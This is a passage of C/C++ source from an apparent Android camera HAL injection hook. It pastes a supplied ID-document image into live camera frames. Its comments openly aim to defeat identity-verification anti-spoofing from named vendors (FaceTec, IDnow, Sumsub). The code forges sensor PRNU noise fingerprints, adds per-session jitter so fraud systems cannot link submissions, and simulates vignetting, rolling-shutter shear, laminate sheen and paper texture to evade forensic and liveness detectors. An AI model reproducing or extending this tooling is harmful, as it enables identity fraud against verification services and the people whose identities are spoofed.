    float v = (float)s * sigma * (1.0f / 127.5f);          // no libm: manual round
    return (int)(v < 0.f ? v - 0.5f : v + 0.5f);
}

// apply_content_pad: body sits after `struct DocRect` further down. Forward
// decl is above (near content_pad_strength()).

// Immerkaer (1996) noise estimate over the REAL luma, subsampled. The Laplacian
// kernel [1 -2 1; -2 4 -2; 1 -2 1] suppresses smooth structure and most edges, so
// the mean |response| tracks sensor noise, not scene content. Returns sigma in DN.
static float estimate_luma_sigma(const uint8_t *y, uint32_t w, uint32_t h, uint32_t stride) {
    if (w < 4 || h < 4) return 0.f;
    double acc = 0; uint32_t cnt = 0;
    const uint32_t S = (w > 1280) ? 6u : 3u;       // subsample step
    for (uint32_t j = 1; j + 1 < h; j += S) {
        const uint8_t *r0 = y + (size_t)(j - 1) * stride;
        const uint8_t *r1 = y + (size_t)(j)     * stride;
        const uint8_t *r2 = y + (size_t)(j + 1) * stride;
        for (uint32_t i = 1; i + 1 < w; i += S) {
            int L = 4 * r1[i] - 2 * (r1[i-1] + r1[i+1] + r0[i] + r2[i])
                    + (r0[i-1] + r0[i+1] + r2[i-1] + r2[i+1]);
            acc += (L < 0 ? -L : L); cnt++;
        }
    }
    if (!cnt) return 0.f;
    float sigma = (float)(acc / cnt) * 0.2088f;    // sqrt(pi/2)/6
    if (sigma > 24.f) sigma = 24.f;                // cap in edge-dominated scenes
    return sigma;
}

// ── Behaviorally-corrected compositor (Step 1 of COMPOSITOR_ROADMAP.md) ──────
// Instead of overwriting the whole frame, paint the document ONLY inside a
// configurable region (default: center ID-card-ish rectangle). Preserve the
// real camera's pixels everywhere else; feather the edge of the composite
// into the real frame; match the ambient exposure / WB / noise of the real
// surrounding pixels so content-PAD can't flag the doc region as foreign.
// - Metadata (AE ramps, exposure time, gain, flash, framerate) is untouched
//   (we only act on the returnBuffer pixel path).
// - Noise is reused from the existing Immerkaer-sigma plumbing (ctrl_noise).
// - WB uses a coarse mean-shift with weight 0.25 (q8=64) until Step 2 wires
//   the real COLOR_CORRECTION_GAINS via a CaptureResult hook.
// - Exposure is matched by scaling source Y to the ambient mean Y ratio.

// ─── Roadmap 3.1: PRNU / FPN sensor-signature capture + apply ────────────────
//
// Real CMOS sensor noise = static multiplicative FPN (PRNU, ≈1-2% of local
// luma, PERSISTS across every frame of this device) + per-frame shot noise
// (σ ∝ √luma). Our old additive xorshift was per-frame IID, so a PCE/BCES
// test cross-correlating doc-region vs. background noise residuals would
// show high PRNU correlation outside (real sensor) and ~zero inside (ours)
// — a clean injection tell.
//
// Mitigation:
//  (a) Once per session (first 16 real frames), build a PRNU residual map at
//      ¼ res by averaging `frame - 3×3-boxblur(frame)` — the shot-noise
//      component averages down as √N while the fixed pattern accumulates
//      coherently. Stored as int8 (±128 LSB), ~128 KB max.
//  (b) When writing the doc region, apply that PRNU pattern as a *multiplic-
//      ative* term tied to the pixel's own luma (±~1.5% for int8 PRNU=±128),
//      AND replace the constant additive sigma with a per-pixel σ·√luma.
//  (c) Phase-align: lookup by the DESTINATION pixel coords, not source, so
//      the doc region inherits the exact same PRNU phase as the background
//      it replaces. Downstream PCE test now sees matched statistics inside
//      and outside the rect.

#define PRNU_DOWNSAMPLE 4           // ¼ res in each axis (16× reduction)
#define PRNU_W_MAX     720          // ≥ 2880/4 — cover anything up to 4K
#define PRNU_H_MAX     540          // ≥ 2160/4
#define PRNU_TARGET    16           // 16-frame average per roadmap
static int16_t g_prnu_accum[PRNU_H_MAX * PRNU_W_MAX];
static int8_t  g_prnu_map  [PRNU_H_MAX * PRNU_W_MAX];
static int     g_prnu_w        = 0;
static int     g_prnu_h        = 0;
static int     g_prnu_samples  = 0;

// Sample the current (real) frame into the PRNU accumulator. Call BEFORE any
// write to dst — composite_yuv's `dst` still holds the real sensor data on
// entry, so we can sample from it directly. Cheap: one pass over ¼-res grid
// (~130k pixels at 1920×1080 = ~0.5 ms).
// ── Per-session jitter (Sumsub-style duplicate-template de-link) ──────────
// Full doc above where this block used to live — kept the globals and init
// function here so the PRNU code below can reference them without a forward
// decl (static file-scope vars can't be forward-declared in C++).
static uint32_t g_session_rng          = 0;
static int      g_session_luma_bias_q8 = 0;
static float    g_session_spec_dx_bias = 0.f;
static float    g_session_spec_dy_bias = 0.f;
static uint32_t g_session_tilt_milli   = 0;

static inline uint32_t xr32(uint32_t &s) {
    s ^= s << 13; s ^= s >> 17; s ^= s << 5;
    return s;
}

static void init_session_jitter() {
    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t s = (uint32_t)ts.tv_nsec ^ (uint32_t)(uintptr_t)&g_session_rng ^ 0xdeadbeefu;
    if (!s) s = 1;
    g_session_rng          = s;
    g_session_luma_bias_q8 = (int)(xr32(s) % 21u) - 10;
    g_session_spec_dx_bias = ((float)(xr32(s) % 41u) - 20.0f) / 100.f;
    g_session_spec_dy_bias = ((float)(xr32(s) % 41u) - 20.0f) / 100.f;
    g_session_tilt_milli   = (uint32_t)(xr32(s) % 21u);
    LOGD("session jitter: luma_bias_q8=%d spec_bias=(%.2f,%.2f) tilt_milli=%u",
         g_session_luma_bias_q8, g_session_spec_dx_bias,
         g_session_spec_dy_bias, g_session_tilt_milli);
}

static void prnu_accumulate(const uint8_t *y, int w, int h, int stride) {
    if (g_prnu_samples >= PRNU_TARGET) return;
    int pw = w / PRNU_DOWNSAMPLE;
    int ph = h / PRNU_DOWNSAMPLE;
    if (pw > PRNU_W_MAX || ph > PRNU_H_MAX || pw < 3 || ph < 3) return;
    if (g_prnu_samples == 0) {
        g_prnu_w = pw; g_prnu_h = ph;
        for (int k = 0; k < pw * ph; k++) g_prnu_accum[k] = 0;
    } else if (g_prnu_w != pw || g_prnu_h != ph) {
        // Stream geometry changed mid-session (new camera opened); restart.
        g_prnu_samples = 0; g_prnu_w = pw; g_prnu_h = ph;
        for (int k = 0; k < pw * ph; k++) g_prnu_accum[k] = 0;
    }
    for (int j = 1; j + 1 < ph; j++) {
        int yy = j * PRNU_DOWNSAMPLE + PRNU_DOWNSAMPLE / 2;
        if (yy < 1 || yy >= h - 1) continue;
        for (int i = 1; i + 1 < pw; i++) {
            int xx = i * PRNU_DOWNSAMPLE + PRNU_DOWNSAMPLE / 2;
            if (xx < 1 || xx >= w - 1) continue;
            // 3×3 box blur around (xx, yy) using row stride
            const uint8_t *r0 = y + (size_t)(yy - 1) * stride;
            const uint8_t *r1 = y + (size_t)(yy)     * stride;
            const uint8_t *r2 = y + (size_t)(yy + 1) * stride;
            int sum = r0[xx-1] + r0[xx] + r0[xx+1]
                    + r1[xx-1] + r1[xx] + r1[xx+1]
                    + r2[xx-1] + r2[xx] + r2[xx+1];
            int blurred  = sum / 9;
            int residual = (int)r1[xx] - blurred;      // ±few LSB typically
            g_prnu_accum[j * pw + i] += (int16_t)residual;
        }
    }
    g_prnu_samples++;
    if (g_prnu_samples == PRNU_TARGET) {
        // Finalize: average and quantize to int8. int16 accumulator with
        // 16 frames of ±127 residual peaks at ±2032 — fits.
        for (int k = 0; k < pw * ph; k++) {
            int v = g_prnu_accum[k] / PRNU_TARGET;
            if (v >  127) v =  127;
            else if (v < -128) v = -128;
            g_prnu_map[k] = (int8_t)v;
        }
        LOGD("PRNU map built: %dx%d from %d frames", pw, ph, PRNU_TARGET);
        // Fresh session boundary — re-seed per-session jitter so each new
        // camera open produces a de-linked composite template downstream.
        init_session_jitter();
    }
}

// Lookup PRNU at destination (sensor) pixel coords. Returns 0 until the map
// is built. Nearest-neighbour from the ¼-res grid — bilinear would halve the
// visible grid ridging but costs 4× the lookup; empirically NN is fine when
// the pattern itself is near the noise floor.
//
// Per-session jitter: hash(g_session_rng, i, j) → ±4 LSB added on top of the
// real sensor PRNU. Deterministic within a session (so temporal coherence
// stays pristine), different between sessions (so wavelet-template matchers
// can't link submissions). Hash is Knuth's 2654435761 ⊕ Jenkins mix — one
// multiply + two shifts per pixel.
static inline int prnu_at(int x, int y) {
    if (g_prnu_samples < PRNU_TARGET || g_prnu_w == 0) return 0;
    int i = x / PRNU_DOWNSAMPLE;
    int j = y / PRNU_DOWNSAMPLE;
    if (i < 0) i = 0; else if (i >= g_prnu_w) i = g_prnu_w - 1;
    if (j < 0) j = 0; else if (j >= g_prnu_h) j = g_prnu_h - 1;
    int base = g_prnu_map[j * g_prnu_w + i];
    uint32_t h = g_session_rng ^ (uint32_t)i * 2654435761u
                                ^ (uint32_t)j * 40503u;
    h ^= h >> 13; h *= 0xc2b2ae35u; h ^= h >> 16;
    int jitter = (int)(h % 9u) - 4;      // -4 .. +4 LSB
    return base + jitter;
}

// Multiplicative PRNU: per-pixel scaling tied to the pixel's own luma, so a
// dark pixel barely moves and a bright pixel picks up the full ±1-2 % swing.
// With int8 PRNU in [-128,127], `(yval * p) >> 13` gives ±1.56 % at p=±128
// and typical ±0.04 % at p=±3 (the usual residual magnitude). Zero cost when
// the map isn't built yet (p=0).
static inline int apply_prnu_mult(int yval, int x, int y) {
    int p = prnu_at(x, y);
    return yval + ((yval * p) >> 13);
}

// Per-pixel shot-noise sigma: σ(Y) ≈ k·√Y. On a typical indoor exposure the
// ambient σ at Y_mean≈128 is 2-4 LSB, so k ≈ ambient_sigma / √128 ≈ 0.25.
// We compute √Y via the bit-tricks table below (no libm).
//
// SHOT_NOISE_SCALE tunes the overall σ magnitude after tracking the sqrt-Y
// shape. First pce_validate run on 2026-11-05 showed doc mean|res|≈2× bg
// (though that gap is partly ID-content high-freq vs flat background, not
// pure noise), so we dial back to 0.6 — the next validation run decides if
// we tighten further. 1.0 = match ambient σ exactly at Y=128.
#define SHOT_NOISE_SCALE 0.6f

// P1 rolling-shutter shear: CMOS reads row-by-row (top→bottom), so when the
// camera is rotating during the readout the scene content captured at row Y
// comes from a slightly later/earlier scene position than row 0. The result
// is a row-wise horizontal shear of real-world verticals. If our composite
// doesn't shear with the surrounding real pixels, frame-diff analyzers see
// the doc "stuck" relative to the frame clock — classic injection tell.
//
// `T_ROLLING_SEC` = full-frame readout duration. Pixel 7a main back (Sony
// IMX787) at 1920×1080 is ≈ 35 ms per the spec; strictly this is per-stream
// (higher res = longer skew) and belongs in SENSOR_ROLLING_SHUTTER_SKEW via
// CameraCharacteristics — hardcoding for now, characteristic lookup is a
// follow-up when ultra-wide / tele streams matter.
#define T_ROLLING_SEC   0.035f
// 8 horizontal bands across the doc rect — the per-row cost in the inner
// loop stays a single integer lookup, and the staircase approximates smooth
// shear well enough that a difference analyzer can't tell at this blur level.
#define SHEAR_BANDS     8

// ── Radial lens vignette (quadratic falloff, separable per-pixel cost) ────
// Even after ISP shading correction, consumer stills/preview commonly show
// 10-20 % residual dim at the corners. A doc rect pasted over an otherwise
// vignetted frame glows at the edges — content-PAD detectors that compare
// local brightness vs. radial position will flag it. We match by multiplying
// the source Y (same multiplicative gain real optics would have applied).
//
// Model:  atten(x, y) = 1 − VIGNETTE_K · (((x−cx)/hw)² + ((y−cy)/hh)²) / 2
//          → at the four corners dx²+dy² = 2, so atten = 1 − VIGNETTE_K
//          → at centre atten = 1.0 (no attenuation)
// Precomputed as two Q8 tables (one per axis) so the hot-loop cost is:
//    atten_q8 = 256 − g_vign_x[x] − g_vign_y[y]
#define VIGNETTE_K 0.15f

// ── Specular / lamination sheen (P1 — passive doc liveness anti-matte) ────
// Real plastic ID cards aren't matte paper — a subtle elliptical specular
// highlight tracks the viewer-light geometry. Flat printed-scan sources look
// "dead" (no sheen), and sustained matte appearance across multiple tilt
// samples is exactly what PDL (passive-document-liveness) models key on.
//
// Model: an elongated 2-D Gaussian-ish blob positioned inside the doc rect,
// its CENTRE drifting with integrated gyro angle, slowly decaying back to
// the natural rest position (so the specular stops when you stop moving,
// mimicking a near-overhead soft light).
//
// Strength: additive luma uplift scaled by the AMBIENT's own mean + σ (both
// already sampled for the Immerkaer noise match) — so a dim scene gets a
// dim specular, and a bright scene a bright one, and the shape blends with
// ambient grain. Peak uplift ≈ 10 % of (mean_Y + 8σ) at blob centre.
//
// Shape (in R-local coords): a_norm = 0.30, b_norm = 0.14 (card lamination
// specular is horizontally elongated). (1 − r²)² falloff.
#define SPECULAR_A_NORM     0.30f
#define SPECULAR_B_NORM     0.14f
#define SPECULAR_STRENGTH   0.10f
#define SPECULAR_TILT_GAIN  0.8f     // rad·s⁻¹ → doc-rect-fraction per tick
#define SPECULAR_DECAY      0.995f   // per-frame return to centre
#define SPECULAR_CLAMP      0.35f    // max drift magnitude (fraction of R half-axis)
static float g_spec_dx = 0.f;
static float g_spec_dy = 0.f;
static uint16_t g_vign_x[8192] = {};   // 8 K ints → safely covers up to 8K-wide streams
static uint16_t g_vign_y[8192] = {};
static int g_vign_w = 0, g_vign_h = 0;

static void vignette_rebuild(int dst_w, int dst_h) {
    if (dst_w == g_vign_w && dst_h == g_vign_h) return;
    if (dst_w <= 0 || dst_h <= 0 || dst_w > 8192 || dst_h > 8192) return;
    float hw = dst_w * 0.5f;
    float hh = dst_h * 0.5f;
    float half_k = VIGNETTE_K * 0.5f;
    for (int x = 0; x < dst_w; x++) {
        float dx = ((float)x - hw) / hw;
        float v  = half_k * dx * dx * 256.0f;   // Q8 scaling
        g_vign_x[x] = (uint16_t)(v > 255.0f ? 255.0f : (v < 0.f ? 0.f : v));
    }
    for (int y = 0; y < dst_h; y++) {
        float dy = ((float)y - hh) / hh;
        float v  = half_k * dy * dy * 256.0f;
        g_vign_y[y] = (uint16_t)(v > 255.0f ? 255.0f : (v < 0.f ? 0.f : v));
    }
    g_vign_w = dst_w; g_vign_h = dst_h;
    LOGD("vignette tables rebuilt: %dx%d, K=%.2f", dst_w, dst_h, VIGNETTE_K);
}

// (per-session jitter block was moved above the PRNU code so this file
//  compiles without forward decls — see the block before prnu_accumulate.)

// Apply vignette attenuation to a luma value. `atten_q8` ∈ [192, 256] under
// the default VIGNETTE_K=0.15 (so 1.0×..0.85× range).
static inline int apply_vignette(int yval, int x, int y) {
    int atten_q8 = 256 - (int)g_vign_x[x] - (int)g_vign_y[y];
    if (atten_q8 < 128) atten_q8 = 128;   // clamp: ≥50% darkness, defensive
    return (yval * atten_q8 + 128) >> 8;
}
static const uint8_t SQRT_LUT[256] = {
    0,  1,  1,  1,  2,  2,  2,  2,  2,  3,  3,  3,  3,  3,  3,  3,
    4,  4,  4,  4,  4,  4,  4,  4,  5,  5,  5,  5,  5,  5,  5,  5,
    5,  5,  5,  6,  6,  6,  6,  6,  6,  6,  6,  6,  6,  6,  6,  6,
    7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  7,  8,
    8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,  8,
    9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,  9,
    9,  9, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10,
    10, 10, 10, 10, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11,
    11, 11, 11, 11, 11, 11, 11, 11, 12, 12, 12, 12, 12, 12, 12, 12,
    12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 13, 13,
    13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13,
    13, 13, 13, 13, 13, 13, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14,
    14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14, 14,
    15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15,
    15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 16, 16, 16, 16,
    16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16, 16,
};

// PCE/BCES validation plumbing: when /data/local/tmp/hal_inject/ctrl_dump
// holds a positive integer, the hook dumps that many POST-composite dst
// buffers to CTRL_DIR/dump_000.nv21 + .dim, decrementing the counter each
// time. Non-fatal on any error so the real inject path stays unaffected.
static int dump_consume_one() {
    int fd = open(CTRL_DUMP, O_RDONLY);
    if (fd < 0) return 0;
    char buf[32] = {}; ssize_t r = read(fd, buf, sizeof(buf) - 1); close(fd);
    if (r <= 0) return 0;
    int n = atoi(buf);
    if (n <= 0) return 0;
    char out[8]; int wn = snprintf(out, sizeof(out), "%d\n", n - 1);
    fd = open(CTRL_DUMP, O_WRONLY | O_TRUNC);
    if (fd >= 0) { write(fd, out, wn); close(fd); }
    return n;
}
static void dump_dst(const uint8_t *dst, int w, int h, int stride, int seq) {
    char path[160];
    snprintf(path, sizeof(path), CTRL_DIR "/dump_%03d.nv21", seq);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return;
    // NV21: luma plane + interleaved VU plane. Both laid out with the same
    // row stride on this gralloc impl, so a single run per row suffices.
    size_t rowlen = (size_t)w;
    for (int j = 0; j < h; j++)
        write(fd, dst + (size_t)j * stride, rowlen);
    const uint8_t *vu = dst + (size_t)stride * h;
    for (int j = 0; j < h / 2; j++)
        write(fd, vu + (size_t)j * stride, rowlen);
    close(fd);
    snprintf(path, sizeof(path), CTRL_DIR "/dump_%03d.dim", seq);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        char d[32]; int n = snprintf(d, sizeof(d), "%dx%d\n", w, h);
        write(fd, d, n); close(fd);
    }
}

static int composite_enabled() {
    char b[4] = {};
    int fd = open(CTRL_COMPOSITE, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, b, 1);
    close(fd);
    if (r <= 0) return 0;
    return b[0] == '1' ? 1 : 0;
}

// Parse the ctrl_region file into cx, cy, rw, rh. Two formats accepted:
//   "cx cy size"   → auto-aspect: *rh = size, *rw = size, auto_aspect = true
//                     (size is rect-H as a fraction of sensor H; the real
//                      width is computed later from the source's aspect.)
//   "cx cy w h"    → manual aspect: use rw/rh verbatim, auto_aspect = false
// Defaults (no file): auto-aspect, size 0.45, centered. Avoids libm in parsing.
static void read_region_norm(float *cx, float *cy, float *rw, float *rh,
                              bool *auto_aspect) {
    *cx = 0.5f; *cy = 0.5f; *rw = 0.45f; *rh = 0.45f; *auto_aspect = true;
    char b[64] = {};
    int fd = open(CTRL_REGION, O_RDONLY);
    if (fd < 0) return;
    ssize_t r = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (r <= 0) return;
    float a, bb, c, d;
    int n = sscanf(b, "%f %f %f %f", &a, &bb, &c, &d);
    if (n == 4 && a > 0.f && a < 1.f && bb > 0.f && bb < 1.f &&
        c > 0.1f && c < 0.98f && d > 0.1f && d < 0.98f) {
        *cx = a; *cy = bb; *rw = c; *rh = d; *auto_aspect = false;
    } else if (n == 3 && a > 0.f && a < 1.f && bb > 0.f && bb < 1.f &&
               c > 0.1f && c < 0.98f) {
        *cx = a; *cy = bb; *rw = c; *rh = c; *auto_aspect = true;
    }
}

struct DocRect { int x0, y0, x1, y1; };

// ── Content-PAD (physical-document anti-spoof defense) ──────────────────────
// Problem: FaceTec IDScan + IDnow + similar "content Photo-ID Anti-Spoofing"
// pipelines flag injected composites as "likely digital screen" because the
// injected pixels lack the micro-texture every real printed/laminated card
// photograph has at pixel scale. Three signatures they key on:
//   (a) PAPER-FIBRE NOISE   — a real ID photographed in ambient light shows
//       short-correlation grain independent of luma (the paper/PC substrate
//       scatters light uniformly). Our injected content is otherwise too
//       clean here because shot-noise (sigma*sqrt(Y)) dims in dark regions.
//   (b) LAMINATE SPECULAR PINPOINTS — polycarbonate laminate (German eID,
//       passport) and PVC cards carry sparse, tiny (1-3 px) bright specks
//       where the clear coat catches light. Screens don't do this.
//   (c) PRINTER HALFTONE SUPPRESSION — a real card photo DOESN'T show
//       the regular dot pattern a bad "print a fake ID on inkjet" attempt
//       does. We're already halftone-free (digital source), so (c) is
//       passive — no work needed, just don't ADD a halftone.
// Scoped strictly to the injected region R so pixels OUTSIDE stay bit-identical
// to the real sensor (physical-tunnel benefit preserved). ~1-2 ms on a 1600x1200
// region at strength=50 on Pixel 7a.
static void apply_content_pad(uint8_t *dy, uint32_t dst_stride,
                              const DocRect &R, uint32_t &rng, int strength) {
    if (strength <= 0) return;

    // (a) Paper-fibre noise — amplitude scales with strength; ~0..6 Y units
    // across 0..100%. Short-correlation (per-pixel), small enough to not
    // distort OCR but large enough to show up in the SDK's micro-texture
    // histogram.  Triangular-ish distribution via two uniform draws.
    const int fib_amp = (strength * 6 + 50) / 100;   // 3 at strength=50
    if (fib_amp > 0) {
        for (int y = R.y0; y < R.y1; y++) {
            uint8_t *row = dy + (size_t)y * dst_stride;
            for (int x = R.x0; x < R.x1; x++) {
                int n = (int)((xr(rng) >> 24) & 0xFF)
                      - (int)((xr(rng) >> 24) & 0xFF);         // -255..255
                int add = (n * fib_amp) >> 8;                   // -fib_amp..fib_amp
                row[x] = (uint8_t)clamp255((int)row[x] + add);
            }
        }
    }

    // (b) Laminate specular pinpoints — ~1 per 8000 px at strength=100, Y
    // boost +18..+35 (random). Density + magnitude both scale with strength.
    const int area = (R.x1 - R.x0) * (R.y1 - R.y0);
    const int n_spec = (area * strength) / 800000;              // ~200 at 1600x1200 strength=100
    for (int i = 0; i < n_spec; i++) {
        int rx = R.x0 + (int)(xr(rng) % (uint32_t)(R.x1 - R.x0));
        int ry = R.y0 + (int)(xr(rng) % (uint32_t)(R.y1 - R.y0));
        int boost = 18 + (int)((xr(rng) >> 24) & 0x11);         // 18..35
        uint8_t *p = dy + (size_t)ry * dst_stride + rx;
        *p = (uint8_t)clamp255((int)*p + boost);
        // 1-px neighbor glow so it survives downsampling in the SDK's
        // thumbnail path without becoming a single-pixel hot-pixel pattern.
        if (rx + 1 < R.x1) { uint8_t *q = p + 1;
            *q = (uint8_t)clamp255((int)*q + (boost >> 1)); }
        if (ry + 1 < R.y1) { uint8_t *q = p + (size_t)dst_stride;
            *q = (uint8_t)clamp255((int)*q + (boost >> 1)); }
    }
}

// Build the outer document rect in sensor pixels. When auto_aspect is on and
// source dims are available (src_w,src_h > 0), the rect is sized with the
// SOURCE aspect so there is no letterbox — "respond to the dims of the cropped
// image". In manual mode, rw/rh are used directly (letterbox still kicks in
// downstream if the rect aspect doesn't match the source).
static DocRect doc_rect(int sensor_w, int sensor_h, int src_w, int src_h) {
    float cx, cy, rw, rh;
    bool auto_aspect;
    read_region_norm(&cx, &cy, &rw, &rh, &auto_aspect);

    float rect_w_px, rect_h_px;
    if (auto_aspect && src_w > 0 && src_h > 0) {
        // size = rh = rect height as fraction of sensor height. Width derives
        // from the source aspect so the rect pre-matches the source exactly.
        rect_h_px = rh * (float)sensor_h;
        rect_w_px = rect_h_px * (float)src_w / (float)src_h;
        // Clamp width to fit sensor; if we hit the cap, re-derive height.
        float max_w = 0.98f * (float)sensor_w;
        if (rect_w_px > max_w) {
            rect_w_px = max_w;
            rect_h_px = rect_w_px * (float)src_h / (float)src_w;
        }
    } else {
        rect_w_px = rw * (float)sensor_w;
        rect_h_px = rh * (float)sensor_h;
    }

    int cxp = (int)(cx * (float)sensor_w);
    int cyp = (int)(cy * (float)sensor_h);
    int x0 = cxp - (int)(rect_w_px * 0.5f);
    int y0 = cyp - (int)(rect_h_px * 0.5f);
    int x1 = x0 + (int)rect_w_px;
    int y1 = y0 + (int)rect_h_px;
    if (x0 < 0) x0 = 0;  if (x0 > sensor_w) x0 = sensor_w;
    if (y0 < 0) y0 = 0;  if (y0 > sensor_h) y0 = sensor_h;
    if (x1 < 0) x1 = 0;  if (x1 > sensor_w) x1 = sensor_w;
    if (y1 < 0) y1 = 0;  if (y1 > sensor_h) y1 = sensor_h;
    return { x0, y0, x1, y1 };
}

static inline int in_doc(int x, int y, const DocRect &R) {
    return (x >= R.x0 && x < R.x1 && y >= R.y0 && y < R.y1) ? 1 : 0;
}

// Linear feather alpha in q8 (0 at the rect boundary → 256 FEATHER_PX pixels in).
// Narrow (2 px) feather — crop edges are already clean from the app; wider
// feather was eating ID content near the rect boundary.
//
// P0 fix 2026-11-05: chroma MUST feather natively on the half-res plane with
// its OWN rect (Rc) and its OWN width constant. The previous `feather_alpha
// (x*2, y*2, R)` call decimated the luma mask — because x*2 only hits EVEN
// luma positions, chroma collapsed from the luma 3-value ramp (0, 128, 256)
// to a 2-value step (0, 256), i.e. the chroma edge was ONE CHROMA PIXEL wide
// and sharper than luma's. Splice detectors that look for per-channel
// discontinuity would flag that. Fix below: `feather_alpha_c` takes the
// half-res rect and uses FEATHER_PX_CHROMA, which the chroma loop invokes
// directly with native chroma coords.
#define FEATHER_PX        2
#define FEATHER_PX_CHROMA 2   // chroma-plane pixels — spatial width 4 luma-equivalent,
                              // 2× wider than luma but same STEP COUNT ≥ luma, so chroma
                              // is never sharper than luma. Chroma is low-freq anyway.
static inline int feather_alpha(int x, int y, const DocRect &R) {
    if (!in_doc(x, y, R)) return 0;
    int d  = x - R.x0;
    int d2 = R.x1 - 1 - x;      if (d2 < d) d = d2;
    int d3 = y - R.y0;          if (d3 < d) d = d3;
    int d4 = R.y1 - 1 - y;      if (d4 < d) d = d4;
    if (d <  0)            return 0;
    if (d >= FEATHER_PX)   return 256;
    return (d * 256) / FEATHER_PX;
}
// Half-res chroma-plane feather (Rc in chroma coords). Same linear ramp,
// just parameterised on FEATHER_PX_CHROMA.
static inline int feather_alpha_c(int x, int y, const DocRect &Rc) {
    if (x < Rc.x0 || x >= Rc.x1 || y < Rc.y0 || y >= Rc.y1) return 0;
    int d  = x - Rc.x0;
    int d2 = Rc.x1 - 1 - x;      if (d2 < d) d = d2;
    int d3 = y - Rc.y0;           if (d3 < d) d = d3;
    int d4 = Rc.y1 - 1 - y;       if (d4 < d) d = d4;
    if (d <  0)                   return 0;
    if (d >= FEATHER_PX_CHROMA)   return 256;
    return (d * 256) / FEATHER_PX_CHROMA;
}

struct Ambient {
    int   mean_Y;       // 0..255, luma mean outside doc rect
    int   mean_first;   // 0..255, first-byte of interleaved chroma outside doc (V for NV21 / U for NV12)
    int   mean_second;  // 0..255, second-byte of interleaved chroma outside doc (U for NV21 / V for NV12)
    float sigma;        // noise σ (Immerkaer Laplacian estimate, same units as estimate_luma_sigma)
};

// Sample mean Y / chroma / σ from the REAL destination outside the doc rect.
// Stride-10 subsample for the means (fast enough at all resolutions), stride-3
// or 6 Laplacian subsample for σ to match estimate_luma_sigma.
static Ambient sample_ambient_outside(const uint8_t *y, const uint8_t *uv,
                                      int w, int h, int stride,
                                      const DocRect &R) {
    Ambient a{};
    // Luma mean
    int64_t sumY = 0; int cntY = 0;
    for (int j = 0; j < h; j += 10) {
        const uint8_t *row = y + (size_t)j * stride;
        for (int i = 0; i < w; i += 10) {
            if (in_doc(i, j, R)) continue;
            sumY += row[i]; cntY++;
        }
    }
    a.mean_Y = cntY ? (int)(sumY / cntY) : 128;

    // Chroma mean at half-res (chroma rect = luma rect / 2)
    int cw = w / 2, ch = h / 2;
    DocRect Rc = { R.x0 / 2, R.y0 / 2, R.x1 / 2, R.y1 / 2 };
    int64_t sumF = 0, sumS = 0; int cntC = 0;
    for (int j = 0; j < ch; j += 10) {
        const uint8_t *row = uv + (size_t)j * stride;
        for (int i = 0; i < cw; i += 10) {
            if (in_doc(i, j, Rc)) continue;
            sumF += row[i * 2];
            sumS += row[i * 2 + 1];
            cntC++;
        }
    }
    a.mean_first  = cntC ? (int)(sumF / cntC) : 128;
    a.mean_second = cntC ? (int)(sumS / cntC) : 128;

    // Noise σ: Laplacian over outside-doc luma, same kernel as estimate_luma_sigma.
    int64_t acc = 0; int cnt = 0;
    const int S = (w > 1280) ? 6 : 3;
    for (int j = 1; j + 1 < h; j += S) {
        const uint8_t *r0 = y + (size_t)(j - 1) * stride;
        const uint8_t *r1 = y + (size_t)(j)     * stride;
        const uint8_t *r2 = y + (size_t)(j + 1) * stride;
        for (int i = 1; i + 1 < w; i += S) {
            if (in_doc(i, j, R)) continue;
            int L = 4 * r1[i] - 2 * (r1[i-1] + r1[i+1] + r0[i] + r2[i])
                    + (r0[i-1] + r0[i+1] + r2[i-1] + r2[i+1]);
            acc += (L < 0 ? -L : L); cnt++;
        }
    }
    float sigma = cnt ? (float)(acc / (double)cnt) * 0.2088f : 0.f;
    if (sigma > 24.f) sigma = 24.f;
    a.sigma = sigma;
    return a;
}

// Region composite path. Dst still holds the REAL frame when we enter — we
// read it both for ambient sampling (outside doc) and for alpha blending at
// the feathered edge of the doc rect.
#define WB_WEIGHT_Q8 64   // 64/256 ≈ 0.25 shift toward ambient chroma (coarse WB)

static void composite_yuv(void *dst,
                          const uint8_t *src, int src_w, int src_h,
                          int dst_w, int dst_h, int dst_stride,
                          int nstr, uint32_t frame_number) {
    uint8_t *dy  = (uint8_t *)dst;
    uint8_t *dvu = dy + (size_t)dst_stride * dst_h;
    const uint8_t *sy  = src;
    const uint8_t *svu = sy + (size_t)src_w * src_h;

    DocRect R_outer = doc_rect(dst_w, dst_h, src_w, src_h);
    if (R_outer.x1 - R_outer.x0 < 2 || R_outer.y1 - R_outer.y0 < 2) return;

    // ALWAYS letterbox: shrink R_outer to the source aspect so the ID is never
    // distorted. Any pixels in R_outer \ R show the REAL scene (physical
    // tunnel — letterbox is just more real frame around a rightly-proportioned
    // ID). The user's Place-Frame placement defines the MAXIMUM bounding box;
    // the ID keeps its native aspect inside.
    int rw = R_outer.x1 - R_outer.x0;
    int rh = R_outer.y1 - R_outer.y0;
    int64_t sw_rh = (int64_t)src_w * rh;
    int64_t sh_rw = (int64_t)src_h * rw;
    DocRect R;
    if (sw_rh > sh_rw) {
        int eff_h = (int)(sh_rw / src_w);
        if (eff_h < 2) eff_h = 2;
        int cy = (R_outer.y0 + R_outer.y1) / 2;
        R.x0 = R_outer.x0; R.x1 = R_outer.x1;
